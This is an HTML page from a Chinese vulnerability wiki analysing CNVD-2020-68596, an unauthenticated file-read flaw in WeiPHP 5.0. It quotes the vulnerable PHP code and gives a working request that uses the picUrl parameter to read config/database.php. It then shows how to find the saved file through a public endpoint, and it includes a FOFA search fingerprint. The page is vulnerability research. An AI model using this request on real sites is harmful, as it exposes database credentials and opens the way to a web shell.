@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/WeiPHP5.0%20download_imgage%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WeiPHP5.0 download_imgage \u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6 CNVD-2020-68596", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/" class="btn btn-xs btn-link">
+        WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WeiPHP5.0%20bind_follow%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WeiPHP5.0%20bind_follow%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WeiPHP5.0 bind_follow SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="weiphp50-download_imgage-cnvd-2020-68596">WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596<a class="headerlink" href="#weiphp50-download_imgage-cnvd-2020-68596" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Weiphp &lt;= 5.0
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;WeiPHP&quot;
+</code></pre></div>
+<h2 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p><a href="https://www.weiphp.cn/doc/Initialization_database.html">weiphp5.0官方下载参考手册</a></p>
+<p>参考官方手册创建网站即可</p>
+<p><img alt="image-20220518155931404" src="../images/202205181559468.png" /></p>
+<p>漏洞函数文件:<code>application\material\controller\Material.php</code></p>
+<p>漏洞函数:<code>_download_imgage</code></p>
+<p><img alt="image-20220518160008264" src="../images/202205181600401.png" /></p>
+<div class="highlight"><pre><span></span><code>public function _download_imgage($media_id, $picUrl = &#39;&#39;, $dd = null)
+    {
+        $savePath = SITE_PATH . &#39;/public/uploads/picture/&#39; . time_format(NOW_TIME, &#39;Y-m-d&#39;);
+        mkdirs($savePath);
+        $cover_id = 0;
+        if (empty($picUrl)) {
+            // 获取图片URL
+            $url = &#39;https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=&#39; . get_access_token();
+            $param[&#39;media_id&#39;] = $media_id;
+            // dump($url);
+            $picContent = post_data($url, $param, &#39;json&#39;, false);
+            $picjson = json_decode($picContent, true);
+            // dump($picjson);die;
+            if (isset($picjson[&#39;errcode&#39;]) &amp;&amp; $picjson[&#39;errcode&#39;] != 0) {
+                $cover_id = do_down_image($media_id, $dd[&#39;thumb_url&#39;]);
+                if (!$cover_id) {
+                    return 0;
+                    exit();
+                }
+            }
+            $picName = NOW_TIME . uniqid() . &#39;.jpg&#39;;
+            $picPath = $savePath . &#39;/&#39; . $picName;
+            $res = file_put_contents($picPath, $picContent);
+        } else {
+            $content = wp_file_get_contents($picUrl);
+            // 获取图片扩展名
+            $picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
+            if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
+                $picExt = &#39;jpg&#39;;
+            }
+            $picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
+            $picPath = $savePath . &#39;/&#39; . $picName;
+            $res = file_put_contents($picPath, $content);
+            if (!$res) {
+                $cover_id = do_down_image($media_id);
+                if (!$cover_id) {
+                    return 0;
+                    exit();
+                }
+            }
+        }
+
+        if ($res) {
+            $file = array(
+                &#39;name&#39; =&gt; $picName,
+                &#39;type&#39; =&gt; &#39;application/octet-stream&#39;,
+                &#39;tmp_name&#39; =&gt; $picPath,
+                &#39;size&#39; =&gt; $res,
+                &#39;error&#39; =&gt; 0
+            );
+
+            $File = D(&#39;home/Picture&#39;);
+            $cover_id = $File-&gt;addFile($file);
+        }
+        return $cover_id;
+}
+</code></pre></div>
+<p>首先注意到函数的标识为<code>public</code>，也就是这个函数是公共调用的，并且变量<code>picUrl</code>为可控变量</p>
+<p>根据代码从上向下分析</p>
+<div class="highlight"><pre><span></span><code>$savePath = SITE_PATH . &#39;/public/uploads/picture/&#39; . time_format(NOW_TIME, &#39;Y-m-d&#39;);
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>else {
+            $content = wp_file_get_contents($picUrl);
+            // 获取图片扩展名
+            $picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
+            if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
+                $picExt = &#39;jpg&#39;;
+            }
+            $picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
+            $picPath = $savePath . &#39;/&#39; . $picName;
+            $res = file_put_contents($picPath, $content);
+            if (!$res) {
+                $cover_id = do_down_image($media_id);
+                if (!$cover_id) {
+                    return 0;
+                    exit();
+                }
+            }
+</code></pre></div>
+<p>分析传入变量 <code>picUrl</code> 的 <code>wp_file_get_contents</code>方法</p>
+<div class="highlight"><pre><span></span><code>$content = wp_file_get_contents($picUrl);
+</code></pre></div>
+<p>函数文件位置 <code>application\common.php</code></p>
+<p><img alt="image-20220518160112407" src="../images/202205181601465.png" /></p>
+<p>可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析</p>
+<div class="highlight"><pre><span></span><code>$picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
+if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
+                $picExt = &#39;jpg&#39;;
+}
+$picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
+$picPath = $savePath . &#39;/&#39; . $picName;
+$res = file_put_contents($picPath, $content);
+</code></pre></div>
+<p>这里创建了有关当前时间的图片文件，并写入文件夹<code>/public/uploads/picture/</code> 下</p>
+<p>我们先尝试控制变量 <code>$picUrl</code> 来写入数据库配置文件到图片中</p>
+<div class="highlight"><pre><span></span><code>/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php
+</code></pre></div>
+<p><img alt="image-20220518160132259" src="../images/202205181601329.png" /></p>
+<p>查看目录<code>/public/uploads/picture/</code>，并用记事本打开写入的jpg文件</p>
+<p><img alt="image-20220518160149362" src="../images/202205181601445.png" /></p>
+<p>得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell</p>
+<p><img alt="image-20220518160204626" src="../images/202205181602698.png" /></p>
+<p>在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法</p>
+<p><img alt="image-20220518160225049" src="../images/202205181602112.png" /></p>
+<div class="highlight"><pre><span></span><code>if ($res) {
+            $file = array(
+                &#39;name&#39; =&gt; $picName,
+                &#39;type&#39; =&gt; &#39;application/octet-stream&#39;,
+                &#39;tmp_name&#39; =&gt; $picPath,
+                &#39;size&#39; =&gt; $res,
+                &#39;error&#39; =&gt; 0
+            );
+
+            $File = D(&#39;home/Picture&#39;);
+            $cover_id = $File-&gt;addFile($file);
+        }
+</code></pre></div>
+<p>向下跟进 <code>addFile</code> 函数</p>
+<p>函数位置:<code>application\home\model\Picture.php</code></p>
+<p><img alt="image-20220518160239897" src="../images/202205181602963.png" /></p>
+<div class="highlight"><pre><span></span><code>function addFile($file)
+    {
+        $data[&#39;md5&#39;] = md5_file($file[&#39;tmp_name&#39;]);
+        $id = $this-&gt;where(&#39;md5&#39;, $data[&#39;md5&#39;])-&gt;value(&#39;id&#39;);
+        if ($id &gt; 0) {
+            return $id;
+        }
+
+        $info = pathinfo($file[&#39;tmp_name&#39;]);
+        $data[&#39;path&#39;] = str_replace(SITE_PATH . &#39;/public&#39;, &#39;&#39;, $file[&#39;tmp_name&#39;]);
+
+        $data[&#39;sha1&#39;] = hash_file(&#39;sha1&#39;, $file[&#39;tmp_name&#39;]);
+        $data[&#39;create_time&#39;] = NOW_TIME;
+        $data[&#39;status&#39;] = 1;
+        $data[&#39;wpid&#39;] = get_wpid();
+
+        $id = $this-&gt;insertGetId($data);
+        return $id;
+    }
+</code></pre></div>
+<p>可以看到这部分代码写入了 Picture 表中</p>
+<div class="highlight"><pre><span></span><code>$id = $this-&gt;insertGetId($data);
+</code></pre></div>
+<p>我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了</p>
+<p><img alt="image-20220518160254667" src="../images/202205181602824.png" /></p>
+<p>我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方</p>
+<p><img alt="image-20220518160312578" src="../images/202205181603655.png" /></p>
+<p>找到一处可以利用的地方</p>
+<div class="highlight"><pre><span></span><code>function user_pics()
+    {
+        $map[&#39;wpid&#39;] = get_wpid();
+        $picList = M(&#39;Picture&#39;)-&gt;where(wp_where($map))
+            -&gt;order(&#39;id desc&#39;)
+            -&gt;select();
+        $this-&gt;assign(&#39;picList&#39;, $picList);
+        exit($this-&gt;fetch());
+    }
+</code></pre></div>
+<p>跟进 <code>get_wpid</code> 函数</p>
+<div class="highlight"><pre><span></span><code>function get_wpid($wpid = &#39;&#39;)
+{
+    if (defined(&#39;WPID&#39;)) {
+        return WPID;
+    } else {
+        return 0;
+    }
+}
+</code></pre></div>
+<p>查看 WPID 的定义，文件位置在<code>config\weiphp_define.php</code></p>
+<p><img alt="image-20220518160335575" src="../images/202205181603854.png" /></p>
+<p>定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名</p>
+<p>访问地址: <a href="http://webphp/public/index.php/home/file/user_pids">http://webphp/public/index.php/home/file/user_pids</a></p>
+<p><img alt="image-20220518160401674" src="../images/202205181604752.png" /></p>
+<p>可以看到文件名，根据url地址访问选择下载即可</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/" class="btn btn-xs btn-link">
+        WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WeiPHP5.0%20bind_follow%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WeiPHP5.0%20bind_follow%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WeiPHP5.0 bind_follow SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
